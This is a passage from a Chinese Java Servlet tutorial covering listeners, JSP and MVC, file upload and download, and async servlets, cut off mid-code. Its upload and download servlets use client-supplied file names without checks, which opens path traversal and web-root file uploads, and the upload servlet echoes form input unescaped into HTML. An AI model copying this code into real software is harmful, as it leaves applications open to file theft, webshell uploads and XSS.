<li>加载和解析全局<strong>配置文件</strong> (<code>.properties</code>, <code>.xml</code>)。</li>
<li>启动<strong>定时任务</strong>调度器（如 Quartz）。</li>
<li><strong>初始化 IoC 容器</strong>，例如 Spring 框架的 <code>ContextLoaderListener</code> 就是一个典型的 <code>ServletContextListener</code>，它负责在应用启动时创建和加载 Spring 的应用上下文。</li>
</ul>
</li>
<li><strong>应用关闭时释放资源：</strong> 在 <code>contextDestroyed</code> 方法中，优雅地关闭数据库连接池、停止定时任务等。</li>
</ul>
</li>
<li><strong>使用 <code>HttpSessionListener</code>:</strong><ul>
<li><strong>统计在线用户数量：</strong><ul>
<li>在 <code>sessionCreated</code> 方法中，将一个全局计数器（通常存放在 <code>ServletContext</code> 中）加一。</li>
<li>在 <code>sessionDestroyed</code> 方法中，将该计数器减一。</li>
</ul>
</li>
<li><strong>监控用户会话：</strong> 记录用户会话的创建和销毁日志，用于行为分析或问题排查。</li>
</ul>
</li>
<li><strong>使用 <code>ServletRequestListener</code>:</strong><ul>
<li><strong>记录请求处理时长：</strong> 在 <code>requestInitialized</code> 中记录开始时间戳，在 <code>requestDestroyed</code> 中记录结束时间戳，计算并记录每个请求的耗时，用于性能监控。</li>
</ul>
</li>
<li><strong>使用 <code>HttpSessionAttributeListener</code>:</strong><ul>
<li><strong>监控敏感信息：</strong> 监听 <code>HttpSession</code> 中特定属性（如用户信息、权限列表）的变化，当这些信息被修改时，记录日志以备审计。</li>
</ul>
</li>
</ul>
<hr>
<h1 id="六、高级主题与实践"><a href="#六、高级主题与实践" class="headerlink" title="六、高级主题与实践"></a>六、高级主题与实践</h1><h2 id="1-Servlet-与-JSP-的关系-MVC-模式"><a href="#1-Servlet-与-JSP-的关系-MVC-模式" class="headerlink" title="1. Servlet 与 JSP 的关系 (MVC 模式)"></a>1. Servlet 与 JSP 的关系 (MVC 模式)</h2><h3 id="1-1-JSP的本质"><a href="#1-1-JSP的本质" class="headerlink" title="1.1 JSP的本质"></a>1.1 JSP的本质</h3><p><strong>JSP (JavaServer Pages) 的本质就是一个 Servlet。</strong></p>
<p>这可能是理解 JJSP 文件并不是直接由浏览器执行的，它是一个<strong>模板</strong>，最终会被 Servlet 容器（如 Tomcat 内置的 Jasper 引擎）转换为一个 <code>.java</code> 的 Servlet 源文件，然后编译成一个 <code>.class</code> 文件来运行。</p>
<p><strong>转换过程（第一次访问 JSP 时发生）：</strong></p>
<ol>
<li><strong>翻译 (Translate):</strong> JSP 引擎解析 <code>.jsp</code> 文件。<ul>
<li>文件中的静态 HTML 部分被转换为 Java 代码中的 <code>out.println(&quot;&lt;html&gt;...&quot;);</code> 语句。</li>
<li>JSP 脚本元素，如 Scriptlet (<code>&lt;% ... %&gt;</code>) 和表达式 (<code>&lt;%= ... %&gt;</code>)，被原样插入到生成的 Servlet 的 <code>_jspService()</code> 方法中。</li>
</ul>
</li>
<li><strong>编译 (Compile):</strong> 容器调用 Java 编译器将这个生成的 <code>.java</code> 文件编译成 <code>.class</code> 文件。</li>
<li><strong>执行 (Execute):</strong> 容器加载并执行这个编译好的 Servlet 类，其生命周期和普通 Servlet 一样。</li>
</ol>
<p><strong>为什么要有 JSP？</strong></p>
<p>JSP 的诞生是为了解决早期 Servlet 开发的一个巨大痛点：在 Servlet 的 Java 代码中通过 <code>out.println()</code> 来拼接复杂的 HTML 页面是一场噩梦，难以编写和维护。</p>
<ul>
<li><strong>Servlet 的优势：</strong> 擅长处理 Java 逻辑、控制流程、处理业务。<strong>（逻辑强，表现弱）</strong></li>
<li><strong>JSP 的优势：</strong> 擅长展示动态内容，可以在 HTML 中嵌入少量 Java 代码。<strong>（表现强，逻辑弱）</strong></li>
</ul>
<p>因此，最佳实践就是让它们各司其职。</p>
<hr>
<h3 id="1-2-MVC-设计模式"><a href="#1-2-MVC-设计模式" class="headerlink" title="1.2 MVC 设计模式"></a>1.2 MVC 设计模式</h3><p><strong>MVC (Model-View-Controller)</strong> 是一种经典的软件设计模式，旨在将应用程序的关注点分离，使其更易于维护、扩展和测试。在 Java Web 应用中，Servlet 和 JSP 完美地契合了 MVC 模式中的角色。</p>
<ul>
<li><strong>Model (模型):</strong><ul>
<li><strong>职责：</strong> 负责应用程序的<strong>业务逻辑</strong>和<strong>数据</strong>。它封装了应用的核心状态和行为，与表示层和控制层解耦。</li>
<li><strong>在 Java Web 中通常是：</strong><ul>
<li>JavaBean &#x2F; POJO (Plain Old Java Object) 用来封装数据。</li>
<li>Service 层类用来处理业务逻辑。</li>
<li>DAO (Data Access Object) 层类用来与数据库交互。</li>
</ul>
</li>
</ul>
</li>
<li><strong>View (视图):</strong><ul>
<li><strong>职责：</strong> 负责<strong>展示数据</strong>，即用户界面。它从模型中获取数据并将其呈现给用户。视图本身应包含最少的业务逻辑。</li>
<li><strong>在 Java Web 中通常是：</strong><ul>
<li><strong>JSP</strong>、HTML、Thymeleaf 等模板引擎。</li>
</ul>
</li>
</ul>
</li>
<li><strong>Controller (控制器):</strong><ul>
<li><strong>职责：</strong> 充当<strong>调度者</strong>。它接收来自用户的请求，调用相应的模型来处理请求，然后选择合适的视图来渲染模型返回的数据，最终将视图的输出返回给用户。</li>
<li><strong>在 Java Web 中通常是：</strong><ul>
<li><strong>Servlet</strong>。</li>
</ul>
</li>
</ul>
</li>
</ul>
<hr>
<h3 id="1-3-Servlet-与-JSP-在-MVC-中的协作流程："><a href="#1-3-Servlet-与-JSP-在-MVC-中的协作流程：" class="headerlink" title="1.3 Servlet 与 JSP 在 MVC 中的协作流程："></a>1.3 Servlet 与 JSP 在 MVC 中的协作流程：</h3><pre><code class="highlight mermaid">sequenceDiagram
    title Classic Java Web MVC (Servlet + JSP) Flow

    participant Browser as 用户浏览器
    participant Servlet/Controller as 控制器
    participant Model/Service as 模型/服务
    participant JSP/View as 视图

    Browser-&gt;&gt;Servlet/Controller: 1. 发送 HTTP 请求 (GET /products?id=123)
    activate Servlet/Controller

    note over Servlet/Controller: 2. Servlet 容器将请求映射到此控制器

    Servlet/Controller-&gt;&gt;Model/Service: 3. 调用业务逻辑 (getProductById)
    activate Model/Service
    Model/Service--&gt;&gt;Servlet/Controller: 返回数据 (Product 对象)
    deactivate Model/Service

    note over Servlet/Controller: 4. 将 Product 对象存入 request 作用域

    Servlet/Controller-&gt;&gt;JSP/View: 5. 请求转发 (Forward)
    deactivate Servlet/Controller

    activate JSP/View
    note over JSP/View: 6. 渲染视图&lt;br/&gt;- 从 request 域获取数据&lt;br/&gt;- 使用 EL/JSTL 生成 HTML
    JSP/View--&gt;&gt;Browser: 7. 返回 HTML 响应
    deactivate JSP/View</code></pre>

<ol>
<li><strong>请求到达：</strong> 用户的浏览器发送一个 HTTP 请求（例如 <code>GET /products?id=123</code>）。</li>
<li><strong>控制器接收：</strong> Servlet 容器根据 <code>web.xml</code> 或 <code>@WebServlet</code> 的配置，将请求映射到一个 <strong>Servlet (Controller)</strong>。</li>
<li><strong>控制器处理：</strong><ul>
<li>Servlet 解析请求参数（<code>id=123</code>）。</li>
<li>Servlet <strong>调用 Model</strong>（例如 <code>ProductService.getProductById(123)</code>）来执行业务逻辑，获取数据。</li>
<li>Model 返回一个包含产品信息的 JavaBean (<code>Product</code> 对象)。</li>
</ul>
</li>
<li><strong>存储数据：</strong> Servlet 将从 Model 获取的数据（<code>Product</code> 对象）存入一个<strong>作用域对象</strong>中，最常用的是 <code>request</code> 域：<code>request.setAttribute(&quot;product&quot;, productObject);</code>。</li>
<li><strong>转发到视图：</strong> Servlet <strong>请求转发 (<code>forward</code>)</strong> 给一个 <strong>JSP (View)</strong> 文件，例如 <code>request.getRequestDispatcher(&quot;/WEB-INF/views/productDetail.jsp&quot;).forward(request, response);</code>。</li>
<li><strong>视图渲染：</strong><ul>
<li>JSP 页面被激活。</li>
<li>它从 <code>request</code> 域中取出之前 Servlet 存入的数据。</li>
<li>使用 JSP 标签（如 JSTL）或表达式语言（EL）将数据显示在 HTML 模板中。</li>
</ul>
</li>
<li><strong>响应返回：</strong> JSP 生成的最终 HTML 页面作为响应被发送回用户的浏览器。</li>
</ol>
<hr>
<h2 id="2-文件上传与下载"><a href="#2-文件上传与下载" class="headerlink" title="2. 文件上传与下载"></a>2. 文件上传与下载</h2><h3 id="2-1-文件上传"><a href="#2-1-文件上传" class="headerlink" title="2.1 文件上传"></a>2.1 文件上传</h3><h4 id="2-1-1-前端准备：HTML-表单"><a href="#2-1-1-前端准备：HTML-表单" class="headerlink" title="2.1.1 前端准备：HTML 表单"></a>2.1.1 前端准备：HTML 表单</h4><p>要实现文件上传，HTML <code>&lt;form&gt;</code> 必须满足以下<strong>三个条件</strong>：</p>
<ol>
<li><code>method</code> 必须为 <strong><code>post</code></strong>。</li>
<li><code>enctype</code> (encoding type) 必须设置为 <strong><code>multipart/form-data</code></strong>。这告诉服务器请求体将被分割成多个部分，每个部分代表一个表单字段或一个文件。</li>
<li>必须包含一个 <code>&lt;input type=&quot;file&quot;&gt;</code> 标签。</li>
</ol>
<p><strong>HTML 示例 (<code>upload.html</code>):</strong></p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>File Upload<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">h1</span>&gt;</span>Upload a File<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">form</span> <span class="attr">action</span>=<span class="string">&quot;upload&quot;</span> <span class="attr">method</span>=<span class="string">&quot;post&quot;</span> <span class="attr">enctype</span>=<span class="string">&quot;multipart/form-data&quot;</span>&gt;</span></span><br><span class="line">        Description: <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;text&quot;</span> <span class="attr">name</span>=<span class="string">&quot;description&quot;</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span></span><br><span class="line">        Select file: <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;file&quot;</span> <span class="attr">name</span>=<span class="string">&quot;uploadFile&quot;</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;submit&quot;</span> <span class="attr">value</span>=<span class="string">&quot;Upload&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>

<hr>
<h4 id="2-1-2-后端处理：Servlet"><a href="#2-1-2-后端处理：Servlet" class="headerlink" title="2.1.2 后端处理：Servlet"></a>2.1.2 后端处理：Servlet</h4><p>后端的 Servlet 需要做两件事来启用文件上传处理：</p>
<ol>
<li>在 Servlet 类上添加 <strong><code>@MultipartConfig</code></strong> 注解。这个注解会通知 Servlet 容器，该 Servlet 将会处理 <code>multipart/form-data</code> 类型的请求，容器需要预先解析好请求体，以便我们通过 API 获取文件部分。</li>
<li>使用 <code>request.getPart(String name)</code> 方法来获取上传的文件以及其他表单字段。这个方法返回一个 <code>Part</code> 对象。</li>
</ol>
<p><strong><code>Part</code> 接口的核心方法：</strong></p>
<ul>
<li><code>InputStream getInputStream()</code>: 获取上传文件的输入流，用于读取文件内容。</li>
<li><code>String getSubmittedFileName()</code>: 获取客户端上传的原始文件名。</li>
<li><code>long getSize()</code>: 获取文件的大小（字节）。</li>
<li><code>String getContentType()</code>: 获取文件的 MIME 类型（如 <code>image/jpeg</code>）。</li>
<li><code>void write(String fileName)</code>: 一个便捷方法，直接将上传的文件内容写入到服务器磁盘的指定路径。</li>
</ul>
<p><strong>Servlet 示例 (<code>UploadServlet.java</code>):</strong></p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@WebServlet(&quot;/upload&quot;)</span></span><br><span class="line"><span class="meta">@MultipartConfig(</span></span><br><span class="line"><span class="meta">    // 可以配置上传文件的限制</span></span><br><span class="line"><span class="meta">    // fileSizeThreshold = 1024 * 1024, // 1MB, 超过此大小的文件会直接写入磁盘</span></span><br><span class="line"><span class="meta">    // maxFileSize = 1024 * 1024 * 10,  // 10MB, 单个文件最大值</span></span><br><span class="line"><span class="meta">    // maxRequestSize = 1024 * 1024 * 50 // 50MB, 整个请求的最大值</span></span><br><span class="line"><span class="meta">)</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">UploadServlet</span> <span class="keyword">extends</span> <span class="title class_">HttpServlet</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">String</span> <span class="variable">UPLOAD_DIR</span> <span class="operator">=</span> <span class="string">&quot;uploads&quot;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">doPost</span><span class="params">(HttpServletRequest request, HttpServletResponse response)</span></span><br><span class="line">            <span class="keyword">throws</span> ServletException, IOException &#123;</span><br><span class="line">        </span><br><span class="line">        request.setCharacterEncoding(<span class="string">&quot;UTF-8&quot;</span>);</span><br><span class="line">        response.setContentType(<span class="string">&quot;text/html;charset=UTF-8&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 1. 获取普通表单字段</span></span><br><span class="line">        <span class="type">String</span> <span class="variable">description</span> <span class="operator">=</span> request.getParameter(<span class="string">&quot;description&quot;</span>);</span><br><span class="line">        </span><br><span class="line">        <span class="comment">// 2. 获取文件部分</span></span><br><span class="line">        <span class="type">Part</span> <span class="variable">filePart</span> <span class="operator">=</span> request.getPart(<span class="string">&quot;uploadFile&quot;</span>);</span><br><span class="line">        <span class="type">String</span> <span class="variable">fileName</span> <span class="operator">=</span> filePart.getSubmittedFileName();</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 3. 确定文件存储的绝对路径</span></span><br><span class="line">        <span class="comment">// getServletContext().getRealPath(&quot;&quot;) 获取 Web 应用在服务器上的部署路径</span></span><br><span class="line">        <span class="type">String</span> <span class="variable">applicationPath</span> <span class="operator">=</span> request.getServletContext().getRealPath(<span class="string">&quot;&quot;</span>);</span><br><span class="line">        <span class="type">String</span> <span class="variable">uploadFilePath</span> <span class="operator">=</span> applicationPath + File.separator + UPLOAD_DIR;</span><br><span class="line">        </span><br><span class="line">        <span class="comment">// 创建上传目录（如果不存在）</span></span><br><span class="line">        <span class="type">File</span> <span class="variable">uploadDir</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">File</span>(uploadFilePath);</span><br><span class="line">        <span class="keyword">if</span> (!uploadDir.exists()) &#123;</span><br><span class="line">            uploadDir.mkdirs();</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 4. 将文件写入服务器</span></span><br><span class="line">        <span class="type">String</span> <span class="variable">savePath</span> <span class="operator">=</span> uploadFilePath + File.separator + fileName;</span><br><span class="line">        filePart.write(savePath);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 5. 返回响应</span></span><br><span class="line">        response.getWriter().println(<span class="string">&quot;&lt;h1&gt;Description: &quot;</span> + description + <span class="string">&quot;&lt;/h1&gt;&quot;</span>);</span><br><span class="line">        response.getWriter().println(<span class="string">&quot;&lt;h1&gt;File &quot;</span> + fileName + <span class="string">&quot; has been uploaded successfully!&lt;/h1&gt;&quot;</span>);</span><br><span class="line">        response.getWriter().println(<span class="string">&quot;Saved at: &quot;</span> + savePath);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<hr>
<h3 id="2-2-文件下载"><a href="#2-2-文件下载" class="headerlink" title="2.2 文件下载"></a>2.2 文件下载</h3><p>文件下载指的是服务器将一个文件以<strong>附件 (attachment)</strong> 的形式发送给客户端，触发浏览器的下载对话框，而不是直接在浏览器中打开。</p>
<p>核心技术是设置两个关键的 <strong>HTTP 响应头</strong>：<code>Content-Type</code> 和 <code>Content-Disposition</code>。</p>
<h4 id="2-2-1-实现步骤"><a href="#2-2-1-实现步骤" class="headerlink" title="2.2.1 实现步骤"></a>2.2.1 实现步骤</h4><ol>
<li><strong>确定要下载的文件：</strong> 通常通过请求参数（如 <code>?fileName=report.pdf</code>）来指定。</li>
<li><strong>设置 <code>Content-Type</code>:</strong> 告诉浏览器文件的 MIME 类型。可以使用 <code>getServletContext().getMimeType(fileName)</code> 来动态获取，如果无法确定，可以设置为通用的 <code>application/octet-stream</code>。</li>
<li><strong>设置 <code>Content-Disposition</code> (最关键):</strong><ul>
<li>将其值设置为 <code>attachment; filename=&quot;your_file_name&quot;</code>。</li>
<li><code>attachment</code> 指示浏览器将其作为附件处理。</li>
<li><code>filename</code> 指定了下载时默认显示的文件名。</li>
<li><strong>注意中文文件名乱码问题：</strong> 文件名需要使用 <code>URLEncoder</code> 进行编码，以符合 HTTP Header 规范。</li>
</ul>
</li>
<li><strong>读取文件并写入响应流：</strong><ul>
<li>使用 <code>FileInputStream</code> 读取服务器上的文件。</li>
<li>使用 <code>response.getOutputStream()</code> 获取字节输出流。</li>
<li>将文件内容从输入流循环读取并写入到输出流。</li>
</ul>
</li>
<li><strong>关闭资源：</strong> 确保输入输出流被正确关闭。</li>
</ol>
<p><strong>Servlet 示例 (<code>DownloadServlet.java</code>):</strong></p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@WebServlet(&quot;/download&quot;)</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">DownloadServlet</span> <span class="keyword">extends</span> <span class="title class_">HttpServlet</span> &#123;</span><br><span class="line">    </span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">doGet</span><span class="params">(HttpServletRequest request, HttpServletResponse response)</span></span><br><span class="line">            <span class="keyword">throws</span> ServletException, IOException &#123;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 1. 获取要下载的文件名</span></span><br><span class="line">        <span class="type">String</span> <span class="variable">fileName</span> <span class="operator">=</span> request.getParameter(<span class="string">&quot;filename&quot;</span>);</span><br><span class="line">        <span class="keyword">if</span> (fileName == <span class="literal">null</span> || fileName.trim().isEmpty()) &#123;</span><br><span class="line">            response.getWriter().write(<span class="string">&quot;Please specify a filename.&quot;</span>);</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 假设文件都存储在 /WEB-INF/files/ 目录下，这是一个安全的目录</span></span><br><span class="line">        <span class="type">String</span> <span class="variable">filePath</span> <span class="operator">=</span> <span class="string">&quot;/WEB-INF/files/&quot;</span> + fileName;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 2. 获取文件的真实路径和 ServletContext</span></span><br><span class="line">        <span class="type">ServletContext</span> <span class="variable">context</span> <span class="operator">=</span> getServletContext();</span><br><span class="line">        <span class="type">String</span> <span class="variable">realPath</span> <span class="operator">=</span> context.getRealPath(filePath);</span><br><span class="line">        </span><br><span class="line">        <span class="comment">// 3. 设置响应头</span></span><br><span class="line">        <span class="comment">// 3.1 获取文件MIME类型</span></span><br><span class="line">        <span class="type">String</span> <span class="variable">mimeType</span> <span class="operator">=</span> context.getMimeType(fileName);</span><br><span class="line">        <span class="keyword">if</span> (mimeType == <span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="comment">// 无法识别类型时，使用通用二进制流</span></span><br><span class="line">            mimeType = <span class="string">&quot;application/octet-stream&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        response.setContentType(mimeType);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 3.2 设置 Content-Disposition，解决中文文件名乱码</span></span><br><span class="line">        <span class="type">String</span> <span class="variable">encodedFileName</span> <span class="operator">=</span> URLEncoder.encode(fileName, <span class="string">&quot;UTF-8&quot;</span>).replaceAll(<span class="string">&quot;\\+&quot;</span>, <span class="string">&quot;%20&quot;</span>);</span><br><span class="line">        response.setHeader(<span class="string">&quot;Content-Disposition&quot;</span>, <span class="string">&quot;attachment; filename=\&quot;&quot;</span> + encodedFileName + <span class="string">&quot;\&quot;&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 4. 读取文件并写入响应</span></span><br><span class="line">        <span class="keyword">try</span> (<span class="type">FileInputStream</span> <span class="variable">in</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FileInputStream</span>(realPath);</span><br><span class="line">             <span class="type">ServletOutputStream</span> <span class="variable">out</span> <span class="operator">=</span> response.getOutputStream()) &#123;</span><br><span class="line">            </span><br><span class="line">            <span class="type">byte</span>[] buffer = <span class="keyword">new</span> <span class="title class_">byte</span>[<span class="number">4096</span>];</span><br><span class="line">            <span class="type">int</span> bytesRead;</span><br><span class="line">            <span class="keyword">while</span> ((bytesRead = in.read(buffer)) != -<span class="number">1</span>) &#123;</span><br><span class="line">                out.write(buffer, <span class="number">0</span>, bytesRead);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">            <span class="comment">// 如果文件不存在或读取错误</span></span><br><span class="line">            response.setStatus(HttpServletResponse.SC_NOT_FOUND);</span><br><span class="line">            response.getWriter().write(<span class="string">&quot;File not found or unable to read.&quot;</span>);</span><br><span class="line">            System.err.println(<span class="string">&quot;Error downloading file: &quot;</span> + e.getMessage());</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<hr>
<h2 id="3-异步-Servlet-Servlet-3-0"><a href="#3-异步-Servlet-Servlet-3-0" class="headerlink" title="3. 异步 Servlet (Servlet 3.0+)"></a>3. 异步 Servlet (Servlet 3.0+)</h2><h3 id="3-1-解决的问题"><a href="#3-1-解决的问题" class="headerlink" title="3.1 解决的问题"></a>3.1 解决的问题</h3><p>传统的（同步）Servlet 模型是**“一个请求，一个线程，直到响应完成”**。当一个请求到达时，Servlet 容器会从其线程池中分配一个线程来处理这个请求。这个线程会全程负责执行 Servlet 的 <code>service</code> 方法，直到响应数据完全写入并发送给客户端后，该线程才会被释放并返回到线程池。</p>
<p><strong>核心问题在于：</strong> 如果 Servlet 的业务逻辑中包含<strong>耗时的、阻塞式I&#x2F;O操作</strong>（例如：调用一个缓慢的远程 Web Service、执行一个复杂的数据库查询、等待消息队列的返回），那么这个<strong>请求处理线程就会被长时间阻塞</strong>，空闲地等待，而不能去做其他任何事情。</p>
<p>当大量这样的慢请求并发到达时，容器的线程池会迅速被耗尽。所有线程都被阻塞在等待 I&#x2F;O 上，导致服务器无法再接受和处理新的请求，从而造成<strong>服务吞吐量急剧下降</strong>，甚至<strong>应用崩溃</strong>。这就是所谓的**“线程饥饿 (Thread Starvation)”**。</p>
<p><strong>异步 Servlet 的目的就是为了解决这个问题。</strong></p>
<p>它的核心思想是：<strong>将请求处理线程与耗时的业务逻辑解耦</strong>。当一个耗时操作开始时，Servlet 可以<strong>立即释放</strong>容器的请求处理线程，让它返回线程池去服务其他请求。同时，将耗时任务交给一个<strong>后台的、独立的线程池</strong>去执行。当后台任务完成后，再通过一个回调机制，将结果写回给客户端的响应流。</p>
<p><strong>一句话总结：异步 Servlet 并非让单个慢操作变快，而是通过释放关键的请求处理线程，让服务器在等待慢操作时能处理更多其他请求，从而极大地提高了应用的伸缩性 (Scalability) 和吞吐量 (Throughput)。</strong></p>
<hr>
<h3 id="3-2-核心-API"><a href="#3-2-核心-API" class="headerlink" title="3.2 核心 API"></a>3.2 核心 API</h3><p>实现异步 Servlet 主要涉及以下几个关键 API：</p>
<ol>
<li><strong>开启异步支持:</strong><ul>
<li>必须在 Servlet 配置中明确声明支持异步。</li>
<li><strong>注解方式：</strong> <code>@WebServlet(urlPatterns = &quot;/async&quot;, asyncSupported = true)</code></li>
<li><strong><code>web.xml</code> 方式：</strong> 在 <code>&lt;servlet&gt;</code> 标签中添加 <code>&lt;async-supported&gt;true&lt;/async-supported&gt;</code></li>
</ul>
</li>
<li><strong><code>request.startAsync()</code>:</strong><ul>
<li>这是启动异步处理的入口点。在 <code>doGet</code>&#x2F;<code>doPost</code> 等方法中调用它。</li>
<li>调用后，请求将进入异步模式，原始的 <code>request</code> 和 <code>response</code> 对象会被封装起来。</li>
<li>它返回一个 <code>AsyncContext</code> 对象，这是后续所有异步操作的核心。</li>
<li>一旦调用此方法，容器的请求处理线程就可以结束其 <code>service</code> 方法并被释放了。</li>
</ul>
</li>
<li><strong><code>AsyncContext</code> 对象:</strong><ul>
<li>这是异步处理的上下文环境，持有对原始请求和响应的引用。</li>
<li><strong><code>getRequest()</code> &#x2F; <code>getResponse()</code>:</strong> 从后台线程中获取原始的 <code>request</code> 和 <code>response</code> 对象。</li>
<li><strong><code>start(Runnable run)</code>:</strong> 一个便捷方法，可以将一个 <code>Runnable</code> 任务提交给容器管理的线程池去执行。</li>
<li><strong><code>dispatch(String path)</code>:</strong> 在异步任务完成后，可以将请求<strong>派发</strong>给另一个 Servlet 或 JSP 来完成最终的响应渲染。</li>
<li><strong><code>complete()</code>: (最重要)</strong> 当异步任务处理完成，并且响应数据已经写入完毕时，<strong>必须调用此方法</strong>。它会通知容器，该异步过程已结束，可以关闭连接并将响应发送给客户端。</li>
<li><strong><code>setTimeout(long timeout)</code>:</strong> 设置异步操作的超时时间（毫秒）。如果超时，会触发 <code>AsyncListener</code> 的 <code>onTimeout</code> 事件。</li>
<li><strong><code>addListener(AsyncListener listener)</code>:</strong> 添加一个异步监听器来处理超时、错误、完成等事件。</li>
</ul>
</li>
</ol>
<h4 id="代码示例："><a href="#代码示例：" class="headerlink" title="代码示例："></a>代码示例：</h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span 